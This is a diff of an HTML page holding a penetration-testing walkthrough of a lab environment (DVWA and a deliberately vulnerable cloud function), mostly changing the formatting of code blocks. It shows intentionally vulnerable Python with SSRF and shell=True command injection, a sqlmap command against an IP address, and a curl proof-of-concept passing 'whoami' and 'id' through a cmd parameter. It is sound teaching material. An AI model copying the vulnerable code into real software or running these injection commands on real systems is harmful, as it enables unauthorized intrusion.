 <p><strong>Exposed Credentials:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;api_key&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;stripe_live_example_39ca4c40&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_host&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;internal-db-39ca4c40&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_password&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;EXAMPLE_PASSWORD_123!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_user&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;admin&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;api_key&quot;: &quot;stripe_live_example_39ca4c40&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_host&quot;: &quot;internal-db-39ca4c40&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_password&quot;: &quot;EXAMPLE_PASSWORD_123!&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_user&quot;: &quot;admin&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
 <p><strong>Critical Impact:</strong></p>
 <ul>
 <li class="">
-<p>**Database credentials:**Direct access to the database</p>
+<p><strong>Database credentials:</strong> Direct access to the database</p>
 </li>
 <li class="">
-<p>**API keys:**Potential for unauthorized API access</p>
+<p><strong>API keys:</strong> Potential for unauthorized API access</p>
 </li>
 <li class="">
-<p>**Source code:**Complete Cloud Function source code revealing all vulnerabilities</p>
+<p><strong>Source code:</strong> Complete Cloud Function source code revealing all vulnerabilities</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="analyzing-the-source-code">Analyzing the Source Code<a href="#analyzing-the-source-code" class="hash-link" aria-label="Direct link to Analyzing the Source Code" title="Direct link to Analyzing the Source Code" translate="no">​</a></h3>
 <p>Extracting and analyzing the function source code confirmed the vulnerabilities I had already discovered and revealed the exact implementation:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">def</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vulnerable_handler</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">request: Request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># SSRF vulnerability - no validation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">if</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;url&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> request.args:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        url = request.args.get(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;url&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        response = urllib.request.urlopen(url, timeout=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">return</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> response.read().decode(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;utf-8&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Command injection vulnerability</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">if</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;cmd&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> request.args:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">import</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> subprocess</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        cmd = request.args.get(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;cmd&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        result = subprocess.run(cmd, shell=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">True</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, ...)  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># ⚠️ shell=True!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">return</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> result.stdout</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">def vulnerable_handler(request: Request):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    # SSRF vulnerability - no validation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    if &#x27;url&#x27; in request.args:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        url = request.args.get(&#x27;url&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        response = urllib.request.urlopen(url, timeout=5)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        return response.read().decode(&#x27;utf-8&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    # Command injection vulnerability</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    if &#x27;cmd&#x27; in request.args:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        import subprocess</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        cmd = request.args.get(&#x27;cmd&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        result = subprocess.run(cmd, shell=True, ...)  # ⚠️ shell=True!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        return result.stdout</span><br></div></code></pre></div></div>
 <p><strong>The Code Tells the Story:</strong></p>
 <ul>
 <li class="">
-<p><code>shell=True</code>in<code>subprocess.run()</code>enables command injection</p>
+<p><code>shell=True</code> in <code>subprocess.run()</code> enables command injection</p>
 </li>
 <li class="">
 <p>No URL validation allows SSRF</p>
@@ -843,7 +485,7 @@ html
 <p>While the cloud services had critical vulnerabilities, I also conducted thorough testing of the main web application.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="sql-injection-testing-with-sqlmap">SQL Injection Testing with sqlmap<a href="#sql-injection-testing-with-sqlmap" class="hash-link" aria-label="Direct link to SQL Injection Testing with sqlmap" title="Direct link to SQL Injection Testing with sqlmap" translate="no">​</a></h3>
 <p>Even though DVWA’s security level was “impossible,” I tested for SQL injection:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://34.121.191.196/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--cookie=&quot;security=low; PHPSESSID=&lt;session_id&gt;&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--batch \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--level=5 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--risk=3</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://34.121.191.196/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --cookie=&quot;security=low; PHPSESSID=&lt;session_id&gt;&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --batch \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --level=5 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --risk=3</span><br></div></code></pre></div></div>
 <p><strong>Key Points:</strong></p>
 <ul>
 <li class="">
@@ -856,21 +498,21 @@ html
 <p>Documented results even if not exploitable (security level “impossible”)</p>
 </li>
 </ul>
-<p>**The Lesson:**Always test thoroughly, even when initial indicators suggest vulnerabilities are patched. Sometimes real-world applications have vulnerabilities that training applications don’t.</p>
+<p><strong>The Lesson:</strong> Always test thoroughly, even when initial indicators suggest vulnerabilities are patched. Sometimes real-world applications have vulnerabilities that training applications don’t.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="burp-suite-analysis">Burp Suite Analysis<a href="#burp-suite-analysis" class="hash-link" aria-label="Direct link to Burp Suite Analysis" title="Direct link to Burp Suite Analysis" translate="no">​</a></h3>
 <p>I used Burp Suite for comprehensive web application testing:</p>
 <ul>
 <li class="">
-<p>**Proxy Interception:**Captured all HTTP requests and responses</p>
+<p><strong>Proxy Interception:</strong> Captured all HTTP requests and responses</p>
 </li>
 <li class="">
-<p>**Repeater:**Manually tested suspicious endpoints</p>
+<p><strong>Repeater:</strong> Manually tested suspicious endpoints</p>
 </li>
 <li class="">
-<p>**Intruder:**Fuzzed parameters for hidden vulnerabilities</p>
+<p><strong>Intruder:</strong> Fuzzed parameters for hidden vulnerabilities</p>
 </li>
 <li class="">
-<p>**Scanner:**Automated vulnerability detection</p>
+<p><strong>Scanner:</strong> Automated vulnerability detection</p>
 </li>
 </ul>
 <p><strong>What Burp Revealed:</strong></p>
@@ -888,7 +530,7 @@ html
 <p>Additional endpoints not visible in normal browsing</p>
 </li>
 </ul>
-<p>**Why Burp is Essential:**It provides visibility into the application’s behavior that simple<code>curl</code>commands cannot.</p>
+<p><strong>Why Burp is Essential:</strong> It provides visibility into the application’s behavior that simple <code>curl</code> commands cannot.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-8-documentation-and-reporting">Phase 8: Documentation and Reporting<a href="#phase-8-documentation-and-reporting" class="hash-link" aria-label="Direct link to Phase 8: Documentation and Reporting" title="Direct link to Phase 8: Documentation and Reporting" translate="no">​</a></h2>
 <p>A penetration test is only as good as its documentation. Here’s how I organized my findings.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="organizing-findings">Organizing Findings<a href="#organizing-findings" class="hash-link" aria-label="Direct link to Organizing Findings" title="Direct link to Organizing Findings" translate="no">​</a></h3>
@@ -940,7 +582,7 @@ html
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="creating-proof-of-concept-scripts">Creating Proof of Concept Scripts<a href="#creating-proof-of-concept-scripts" class="hash-link" aria-label="Direct link to Creating Proof of Concept Scripts" title="Direct link to Creating Proof of Concept Scripts" translate="no">​</a></h3>
 <p>I created reproducible PoC scripts:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Command Injection PoC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">FUNCTION_URL=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://...cloudfunctions.net/vulnerable-function-39ca4c40&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">echo</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Testing Command Injection...&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$FUNCTION_URL</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">?cmd=whoami&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$FUNCTION_URL</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">?cmd=id&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Command Injection PoC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">FUNCTION_URL=&quot;https://...cloudfunctions.net/vulnerable-function-39ca4c40&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">echo &quot;Testing Command Injection...&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;$FUNCTION_URL?cmd=whoami&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;$FUNCTION_URL?cmd=id&quot;</span><br></div></code></pre></div></div>
 <p>These scripts allow:</p>
 <ul>
 <li class="">
@@ -978,29 +620,29 @@ html
 <p><strong>Report Structure:</strong></p>
 <ul>
 <li class="">
-<p>**Executive Summary:**High-level overview for management</p>
+<p><strong>Executive Summary:</strong> High-level overview for management</p>
 </li>
 <li class="">
-<p>**Methodology:**How the test was conducted</p>
+<p><strong>Methodology:</strong> How the test was conducted</p>
 </li>
 <li class="">
-<p>**Findings:**Detailed vulnerability descriptions</p>
+<p><strong>Findings:</strong> Detailed vulnerability descriptions</p>
 </li>
 <li class="">
-<p>**Proofs:**Evidence for each finding</p>
+<p><strong>Proofs:</strong> Evidence for each finding</p>
 </li>
 <li class="">
-<p>**Recommendations:**Prioritized remediation steps</p>
+<p><strong>Recommendations:</strong> Prioritized remediation steps</p>
 </li>
 <li class="">
-<p>**Appendix:**Tools used, commands executed, references</p>
+<p><strong>Appendix:</strong> Tools used, commands executed, references</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-lessons-and-takeaways">Key Lessons and Takeaways<a href="#key-lessons-and-takeaways" class="hash-link" aria-label="Direct link to Key Lessons and Takeaways" title="Direct link to Key Lessons and Takeaways" translate="no">​</a></h2>
 <p>This penetration test revealed several important lessons:</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-information-disclosure-is-critical">1. Information Disclosure is Critical<a href="#1-information-disclosure-is-critical" class="hash-link" aria-label="Direct link to 1. Information Disclosure is Critical" title="Direct link to 1. Information Disclosure is Critical" translate="no">​</a></h3>
-<p>The<code>info.php</code>file was the key that unlocked everything. It&#x27;s easy to overlook information disclosure, but it can be devastating.</p>
-<p>**Best Practice:**Regularly audit your applications for:</p>
+<p>The <code>info.php</code> file was the key that unlocked everything. It&#x27;s easy to overlook information disclosure, but it can be devastating.</p>
+<p><strong>Best Practice:</strong> Regularly audit your applications for:</p>
 <ul>
 <li class="">
 <p>Debug endpoints</p>
@@ -1045,7 +687,7 @@ html
 <p>Secret management would prevent credential exposure</p>
 </li>
 </ul>
-<p>**Best Practice:**Implement multiple security controls. If one fails, others provide protection.</p>
+<p><strong>Best Practice:</strong> Implement multiple security controls. If one fails, others provide protection.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-source-code-exposure-amplifies-risk">4. Source Code Exposure Amplifies Risk<a href="#4-source-code-exposure-amplifies-risk" class="hash-link" aria-label="Direct link to 4. Source Code Exposure Amplifies Risk" title="Direct link to 4. Source Code Exposure Amplifies Risk" translate="no">​</a></h3>
 <p>Exposed source code makes it easier for attackers to:</p>
 <ul>
@@ -1059,7 +701,7 @@ html
 <p>Craft targeted exploits</p>
 </li>
 </ul>
-<p>**Best Practice:**Never expose source code in production. Use proper deployment processes.</p>
+<p><strong>Best Practice:</strong> Never expose source code in production. Use proper deployment processes.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-methodical-testing-wins">5. Methodical Testing Wins<a href="#5-methodical-testing-wins" class="hash-link" aria-label="Direct link to 5. Methodical Testing Wins" title="Direct link to 5. Methodical Testing Wins" translate="no">​</a></h3>
 <p>This test succeeded because of methodical, systematic testing:</p>
 <ul>
@@ -1076,17 +718,17 @@ html
 <p>Verified all findings</p>
 </li>
 </ul>
-<p>**Best Practice:**Follow a structured methodology. Don’t skip steps.</p>
+<p><strong>Best Practice:</strong> Follow a structured methodology. Don’t skip steps.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-pitfalls-and-how-to-avoid-them">Common Pitfalls and How to Avoid Them<a href="#common-pitfalls-and-how-to-avoid-them" class="hash-link" aria-label="Direct link to Common Pitfalls and How to Avoid Them" title="Direct link to Common Pitfalls and How to Avoid Them" translate="no">​</a></h2>
 <p>Based on this assessment, here are common mistakes and how to avoid them:</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mistake-1-assuming-security-level-means-security">Mistake 1: Assuming Security Level Means Security<a href="#mistake-1-assuming-security-level-means-security" class="hash-link" aria-label="Direct link to Mistake 1: Assuming Security Level Means Security" title="Direct link to Mistake 1: Assuming Security Level Means Security" translate="no">​</a></h3>
-<p>**The Error:**Assuming “security level impossible” means the application is secure.</p>
-<p>**The Reality:**Security levels in training applications don’t reflect real-world security. Always test thoroughly.</p>
-<p>**How to Avoid:**Test all endpoints regardless of security settings. Look for real-world vulnerabilities, not just training vulnerabilities.</p>
+<p><strong>The Error:</strong> Assuming “security level impossible” means the application is secure.</p>
+<p><strong>The Reality:</strong> Security levels in training applications don’t reflect real-world security. Always test thoroughly.</p>
+<p><strong>How to Avoid:</strong> Test all endpoints regardless of security settings. Look for real-world vulnerabilities, not just training vulnerabilities.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mistake-2-ignoring-information-disclosure">Mistake 2: Ignoring Information Disclosure<a href="#mistake-2-ignoring-information-disclosure" class="hash-link" aria-label="Direct link to Mistake 2: Ignoring Information Disclosure" title="Direct link to Mistake 2: Ignoring Information Disclosure" translate="no">​</a></h3>
-<p>**The Error:**Focusing only on exploitable vulnerabilities, ignoring information leaks.</p>
-<p>**The Reality:**Information disclosure often leads to exploitable vulnerabilities.</p>
-<p>**How to Avoid:**Always check for:</p>
+<p><strong>The Error:</strong> Focusing only on exploitable vulnerabilities, ignoring information leaks.</p>
+<p><strong>The Reality:</strong> Information disclosure often leads to exploitable vulnerabilities.</p>
+<p><strong>How to Avoid:</strong> Always check for:</p>
 <ul>
 <li class="">
 <p>Debug endpoints</p>
@@ -1102,43 +744,43 @@ html
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mistake-3-not-testing-cloud-services-separately">Mistake 3: Not Testing Cloud Services Separately<a href="#mistake-3-not-testing-cloud-services-separately" class="hash-link" aria-label="Direct link to Mistake 3: Not Testing Cloud Services Separately" title="Direct link to Mistake 3: Not Testing Cloud Services Separately" translate="no">​</a></h3>
-<p>**The Error:**Assuming cloud services inherit security from the main application.</p>
-<p>**The Reality:**Each service has its own security posture.</p>
-<p>**How to Avoid:**Test each service independently. Review cloud configurations regularly.</p>
+<p><strong>The Error:</strong> Assuming cloud services inherit security from the main application.</p>
+<p><strong>The Reality:</strong> Each service has its own security posture.</p>
+<p><strong>How to Avoid:</strong> Test each service independently. Review cloud configurations regularly.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mistake-4-poor-documentation">Mistake 4: Poor Documentation<a href="#mistake-4-poor-documentation" class="hash-link" aria-label="Direct link to Mistake 4: Poor Documentation" title="Direct link to Mistake 4: Poor Documentation" translate="no">​</a></h3>
-<p>**The Error:**Not documenting findings as you go.</p>
-<p>**The Reality:**You’ll forget details, and reports are harder to write later.</p>
-<p>**How to Avoid:**Document everything immediately. Save outputs, take screenshots, create PoC scripts.</p>
+<p><strong>The Error:</strong> Not documenting findings as you go.</p>
+<p><strong>The Reality:</strong> You’ll forget details, and reports are harder to write later.</p>
+<p><strong>How to Avoid:</strong> Document everything immediately. Save outputs, take screenshots, create PoC scripts.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-resources">Learning Resources<a href="#learning-resources" class="hash-link" aria-label="Direct link to Learning Resources" title="Direct link to Learning Resources" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>**OWASP Top 10:**Essential web vulnerabilities</p>
+<p><strong>OWASP Top 10:</strong> Essential web vulnerabilities</p>
 </li>
 <li class="">
-<p>**PTES (Penetration Testing Execution Standard):**Methodology framework</p>
+<p><strong>PTES (Penetration Testing Execution Standard):</strong> Methodology framework</p>
 </li>
 <li class="">
-<p>**Cloud Security Alliance:**Cloud-specific security guidance</p>
+<p><strong>Cloud Security Alliance:</strong> Cloud-specific security guidance</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion-the-power-of-methodical-testing">Conclusion: The Power of Methodical Testing<a href="#conclusion-the-power-of-methodical-testing" class="hash-link" aria-label="Direct link to Conclusion: The Power of Methodical Testing" title="Direct link to Conclusion: The Power of Methodical Testing" translate="no">​</a></h2>
 <p>This penetration test demonstrates that successful security assessments don’t always require sophisticated exploits or zero-day vulnerabilities. Often, they result from:</p>
 <ul>
 <li class="">
-<p>**Thorough reconnaissance:**Understanding the target completely</p>
+<p><strong>Thorough reconnaissance:</strong> Understanding the target completely</p>
 </li>
 <li class="">
-<p>**Methodical testing:**Following a structured approach</p>
+<p><strong>Methodical testing:</strong> Following a structured approach</p>
 </li>
 <li class="">
-<p>**Following leads:**When you find something interesting, investigate it</p>
+<p><strong>Following leads:</strong> When you find something interesting, investigate it</p>
 </li>
 <li class="">
-<p>**Comprehensive documentation:**Recording everything for analysis and reporting</p>
+<p><strong>Comprehensive documentation:</strong> Recording everything for analysis and reporting</p>
 </li>
 </ul>
-<p>**The Key Insight:**The most critical vulnerability wasn’t a complex exploit — it was simple information disclosure that revealed an entire attack surface.</p>
-<p>**For Security Professionals:**This walkthrough shows the importance of:</p>
+<p><strong>The Key Insight:</strong> The most critical vulnerability wasn’t a complex exploit — it was simple information disclosure that revealed an entire attack surface.</p>
+<p><strong>For Security Professionals:</strong> This walkthrough shows the importance of:</p>
 <ul>
 <li class="">
 <p>Systematic methodology</p>
@@ -1153,7 +795,7 @@ html
 <p>Comprehensive testing</p>
 </li>
 </ul>
-<p>**For Developers:**This demonstrates why:</p>
+<p><strong>For Developers:</strong> This demonstrates why:</p>
 <ul>
 <li class="">
 <p>Input validation is critical</p>
@@ -1168,7 +810,7 @@ html
 <p>Defense in depth is essential</p>
 </li>
 </ul>
-<p>**For Organizations:**This highlights the need for:</p>
+<p><strong>For Organizations:</strong> This highlights the need for:</p>
 <ul>
 <li class="">
 <p>Regular security assessments</p>
@@ -1187,20 +829,20 @@ html
 <p>Penetration testing is both an art and a science. It requires:</p>
 <ul>
 <li class="">
-<p>**Technical skills:**Understanding tools and techniques</p>
+<p><strong>Technical skills:</strong> Understanding tools and techniques</p>
 </li>
 <li class="">
-<p>**Analytical thinking:**Connecting findings and following leads</p>
+<p><strong>Analytical thinking:</strong> Connecting findings and following leads</p>
 </li>
 <li class="">
-<p>**Persistence:**Not giving up when initial tests fail</p>
+<p><strong>Persistence:</strong> Not giving up when initial tests fail</p>
 </li>
 <li class="">
-<p>**Documentation:**Recording everything for analysis</p>
+<p><strong>Documentation:</strong> Recording everything for analysis</p>
 </li>
 </ul>
 <p>Whether you’re conducting your first penetration test or your hundredth, remember: methodical, thorough testing will always yield better results than rushing to exploitation.</p>
-<p>**Remember:**Always ensure you have proper authorization before testing any system. Unauthorized access is illegal and unethical.</p>
+<p><strong>Remember:</strong> Always ensure you have proper authorization before testing any system. Unauthorized access is illegal and unethical.</p>
 <p><strong>Happy (and ethical) hacking!</strong></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2026/2026-01-29-cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cursor + Hexstrike. Fully Automated ADCS ESC8 Attack</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2026/2026-01-31-ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp-01c02eed5258"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">AI-Assisted Web and Cloud Penetration Testing with Cursor + MCP HexStrike and Burp Suite MCP.</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#how-i-discovered-critical-vulnerabilities-in-a-cloud-environment-using-basic-tools-and-methodical-testing" class="table-of-contents__link toc-highlight">How I Discovered Critical Vulnerabilities in a Cloud Environment Using Basic Tools and Methodical Testing</a></li></ul></li><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#the-setup-tools-and-preparation" class="table-of-contents__link toc-highlight">The Setup: Tools and Preparation</a></li><li><a href="#lab-environment" 